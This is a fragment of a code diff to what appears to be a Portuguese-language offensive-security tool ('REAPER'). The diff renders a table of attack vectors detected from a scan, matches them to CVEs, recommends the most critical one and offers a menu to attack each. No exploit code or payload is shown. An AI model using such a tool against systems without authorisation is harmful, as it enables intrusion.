+        t = Table(box=box.ROUNDED, border_style="red",
+                  header_style="bold red", show_lines=True, title="[bold red]VECTORES DETECTADOS[/bold red]")
+        t.add_column("#",          style="bold white",  width=4,  justify="center")
+        t.add_column("Prioridade", width=16)
+        t.add_column("Vector",     style="bold white",  width=20)
+        t.add_column("Serviço / Versão", style="dim white", width=28)
+        t.add_column("CVE / Risco",      style="yellow",    width=32)
 
-    for i, key in enumerate(detected, 1):
-        v = ATTACK_TREE[key]
-        t.add_row(str(i), f"{v['icon']} {v['label']}", f"Portos relacionados detectados")
+        for i, key in enumerate(detected, 1):
+            v    = ATTACK_TREE[key]
+            info = enriched[key]
+            pri  = info["priority"]
+            pri_label, pri_color = PRIORITY_LABEL.get(pri, PRIORITY_LABEL[4])
 
+            svc_str = info["services"][0] if info["services"] else "Porto aberto"
+            if len(info["services"]) > 1:
+                svc_str += f" +{len(info['services'])-1}"
+
+            if info["cves"]:
+                cve_str = info["cves"][0]["cve"]
+                if len(info["cves"]) > 1:
+                    cve_str += f" +{len(info['cves'])-1}"
+            else:
+                cve_str = "[dim]—[/dim]"
+
+            rec_marker = " [bold green]◄ RECOMENDADO[/bold green]" if info["recommended"] else ""
+            t.add_row(
+                str(i),
+                pri_label,
+                f"{v['icon']} {v['label']}{rec_marker}",
+                svc_str,
+                cve_str,
+            )
+        return t
+
+    t = _build_table()
     console.print(t)
     console.print()
+
+    # Mostrar CVEs detalhados do vector mais crítico
+    top_key = detected[0]
+    top_info = enriched[top_key]
+    if top_info["cves"]:
+        cve_lines = []
+        for c in top_info["cves"][:3]:
+            cve_lines.append(f"  [bold yellow]{c['cve']}[/bold yellow]  {c['desc']}")
+        console.print(Panel(
+            "\n".join(cve_lines),
+            title=f"[bold red]💡 REAPER RECOMENDA — {ATTACK_TREE[top_key]['icon']} {ATTACK_TREE[top_key]['label']}[/bold red]",
+            border_style="red"
+        ))
+        console.print()
+
     console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")
 
     while True:
@@ -1862,12 +3015,29 @@ def _auto_detect_and_attack(scan_output, target, project, save_fn):
             break
         elif ch.isdigit() and 1 <= int(ch) <= len(detected):
             key = detected[int(ch)-1]
+            # Mostrar CVEs antes de entrar
+            info = enriched[key]
+            if info["cves"]:
+                console.print()
+                for c in info["cves"]:
+                    console.print(f"  [yellow]{c['cve']}[/yellow] — {c['desc']}")
+                console.print()
             _attack_vector_menu(key, target, project, save_fn)
-            # Após voltar, mostra de novo os vectores
             console.clear()
             _banner_intel()
+            t = _build_table()
             console.print(t)
             console.print()
+            if top_info["cves"]:
+                cve_lines = []
+                for c in top_info["cves"][:3]:
+                    cve_lines.append(f"  [bold yellow]{c['cve']}[/bold yellow]  {c['desc']}")
+                console.print(Panel(
+                    "\n".join(cve_lines),
+                    title=f"[bold red]💡 REAPER RECOMENDA — {ATTACK_TREE[top_key]['icon']} {ATTACK_TREE[top_key]['label']}[/bold red]",
+                    border_style="red"
+                ))
+                console.print()
             console.print("[dim][número] Atacar vector  [B] Voltar[/dim]")
 
 def _manual_vector_menu(target, project, save_fn):
